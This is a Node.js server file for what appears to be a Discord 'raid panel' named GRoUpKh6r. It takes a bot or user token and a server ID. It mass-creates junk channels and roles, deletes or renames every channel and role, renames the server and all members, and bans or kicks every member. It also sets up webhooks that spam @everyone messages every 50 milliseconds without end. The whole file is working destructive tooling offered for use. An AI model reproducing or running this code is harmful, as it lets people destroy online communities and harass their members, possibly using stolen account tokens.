// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const activeSpammers = new Map();

async function getClient(token, isBot) {
    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMembers,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });
    const fullToken = isBot ? `Bot ${token}` : token;
    await client.login(fullToken).catch(() => {});
    return client;
}

app.post('/api/execute', async (req, res) => {
    let { token, isBot, guildId, action, data } = req.body;
    if (!token || !guildId || !action) return res.status(400).json({ error: 'Missing parameters' });

    let client;
    try {
        client = await getClient(token, isBot);
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) {
            client.destroy();
            return res.status(404).json({ error: 'Guild not found or invalid token/perms' });
        }

        switch (action) {
            case 'create_channels': {
                const count = data.count || 10;
                const name = data.name || 'vanta-raid';
                const promises = [];
                for (let i = 0; i < count; i++) {
                    promises.push(guild.channels.create({ name: name }).catch(() => {}));
                }
                await Promise.all(promises);
                break;
            }
            case 'create_roles': {
                const count = data.count || 10;
                const name = data.name || 'GRoUpKh6r';
                const promises = [];
                for (let i = 0; i < count; i++) {
                    promises.push(guild.roles.create({ name: name }).catch(() => {}));
                }
                await Promise.all(promises);
                break;
            }
            case 'edit_channels': {
                const newName = data.name || 'vanta-ed';
                const channels = await guild.channels.fetch();
                const promises = channels.map(c => c ? c.setName(newName).catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'edit_roles': {
                const newName = data.name || 'GRoUpKh6r-Role';
                const roles = await guild.roles.fetch();
                const promises = roles.map(r => r.id !== guild.id ? r.setName(newName).catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'delete_channels': {
                const channels = await guild.channels.fetch();
                const promises = channels.map(c => c ? c.delete().catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'delete_roles': {
                const roles = await guild.roles.fetch();
                const promises = roles.map(r => r.id !== guild.id && r.editable ? r.delete().catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'edit_server': {
                await guild.setName(data.name || 'GRoUpKh6r').catch(() => {});
                break;
            }
            case 'edit_members': {
                const members = await guild.members.fetch();
                const newName = data.name || 'GRoUpKh6r Member';
                const promises = members.map(m => m.manageable ? m.setNickname(newName).catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'ban_all': {
                const members = await guild.members.fetch();
                const promises = members.map(m => m.bannable ? m.ban().catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'kick_all': {
                const members = await guild.members.fetch();
                const promises = members.map(m => m.kickable ? m.kick().catch(() => {}) : null);
                await Promise.all(promises);
                break;
            }
            case 'webhook_spam_start': {
                const channels = await guild.channels.fetch();
                const textChannels = channels.filter(c => c && c.type === 0);
                const webhooks = [];
                
                for (let [id, channel] of textChannels) {
                    try {
                        let wh = await channel.createWebhook({ name: data.webhookName || 'GRoUpKh6r Spammer' });
                        webhooks.push(wh.url);
                    } catch (e) {}
                }

                const spamKey = `${guildId}_${Date.now()}`;
                const interval = setInterval(async () => {
                    for (let url of webhooks) {
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: data.message || '@everyone https://youtu.be/BdXFz8ESpLc' })
                        }).catch(() => {});
                    }
                }, 50); // أسرع تكرار ممكن

                activeSpammers.set(spamKey, interval);
                client.destroy();
                return res.json({ success: true, message: 'Webhooks created and spam started infinitely!', spamKey });
            }
            case 'webhook_spam_stop': {
                if (data.spamKey && activeSpammers.has(data.spamKey)) {
                    clearInterval(activeSpammers.get(data.spamKey));
                    activeSpammers.delete(data.spamKey);
                } else {
                    // إيقاف الكل لهذا السيرفر
                    for (let [k, v] of activeSpammers.entries()) {
                        if (k.startsWith(guildId)) {
                            clearInterval(v);
                            activeSpammers.delete(k);
                        }
                    }
                }
                break;
            }
            default:
                client.destroy();
                return res.status(400).json({ error: 'Unknown action' });
        }

        client.destroy();
        return res.json({ success: true, message: 'Operation executed successfully.' });
    } catch (err) {
        if (client) client.destroy();
        return res.status(500).json({ error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[7bl] GRoUpKh6r Panel running on port ${PORT}`));
